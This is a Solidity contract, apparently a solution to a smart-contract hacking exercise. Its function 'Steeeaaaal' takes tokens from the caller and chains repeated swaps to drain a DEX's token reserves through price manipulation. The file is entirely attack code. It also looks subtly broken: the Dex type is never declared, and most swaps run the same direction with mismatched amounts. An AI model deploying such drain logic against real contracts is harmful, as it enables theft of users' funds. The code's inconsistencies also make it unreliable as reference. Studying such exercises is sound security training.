// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts/token/ERC20/IERC20.sol";


contract SwipeFunds {
    Dex public dex;
    IERC20 private immutable token1;
    IERC20 private immutable token2;
    
    constructor(address _dex) {
        dex = Dex(_dex);
        token1 = IERC20(dex.token1());
        token2 = IERC20(dex.token2());
    }

    // convenience function
    function getBalances() public view returns (uint[4] memory) {
        uint256[4] memory balances;
        balances[0] = dex.balanceOf(address(token1), address(dex));
        balances[1] = dex.balanceOf(address(token1), address(this));
        balances[2] = dex.balanceOf(address(token2), address(dex));
        balances[3] = dex.balanceOf(address(token2), address(this));
        return balances;
    }

    function Steeeaaaal() external {
        token1.transferFrom(msg.sender, address(this), 10);
        token2.transferFrom(msg.sender, address(this), 10);
        dex.approve(address(dex), 1000);

        dex.swap(address(token1), address(token2), token1.balanceOf(address(this))); //swapPrice = 10,
        dex.swap(address(token2), address(token1), token2.balanceOf(address(this))); 
        dex.swap(address(token2), address(token1), token1.balanceOf(address(this))); 
        dex.swap(address(token2), address(token1), token2.balanceOf(address(this))); 
        dex.swap(address(token2), address(token1), token1.balanceOf(address(this))); 
        dex.swap(address(token2), address(token1), 45);

    }
}
